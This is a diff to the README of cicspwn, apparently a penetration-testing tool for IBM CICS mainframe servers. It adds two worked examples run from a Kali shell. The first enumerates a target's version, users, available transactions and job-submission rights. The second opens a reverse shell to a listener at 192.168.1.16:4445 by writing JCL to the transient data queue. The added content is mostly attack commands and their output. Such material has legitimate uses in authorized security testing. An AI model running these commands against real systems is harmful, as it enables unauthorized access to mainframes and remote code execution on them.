@@ -63,6 +63,49 @@ optional arguments:
 ## Prerequisites
 3270 Python library [py3270](https://pypi.python.org/pypi/py3270/0.2.0)
 
+## Getting general information
+```
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
+[+] Connecting to target 192.168.1.209:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[+] Getting information about CICS server (APPLID: CICS)
+	[*] CICS TS Version 3.2
+[+] Available IBM supplied transactions: 
+	[*] CEMT
+	[*] CECI
+	[*] CEDA
+	[*] CEDF
+[+] General system information: 
+	[*] Userid: CICSUSER
+	[*] Sysid: S650
+	[*] LU session name: LCL704
+	[*] language: E
+	[*] Files HLQ:	CICS650.**
+	[*] Library path:	DFH320.CICS.**
+[+] Active users
+	[*] CICSUSER
+	[*] CICSUSER
+[+] JCL Submission
+	[*] Access to internal spool is apparently available
+	[*] Transiant queue to access spool is apparently available
+		[*] When submitting a job, provide the option --inreader=IRDR
+[+] Access control
+	[*] User CICSUSER authorized to submit JOBS
+```
+## Reverse shell using CICS
+```
+root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse -l 192.168.1.16:4445
+[+] Connecting to target 192.168.1.209:23
+[*] Access to CICS Terminal is possible with APPID CICS
+[+] Setting the current terminal to mixed case
+[*] Got TerminalID L702
+[*] Current terminal is NOW mixed case
+[+] Spool not available apparently, trying via TDQueue
+[+] Writing to the internal TDQueue
+	[*] JCL Written to TDqueue, it should be executed any second
+
+```
+
 ## Copyright and license  
 cicsPWN is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  
 CICSpwn is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
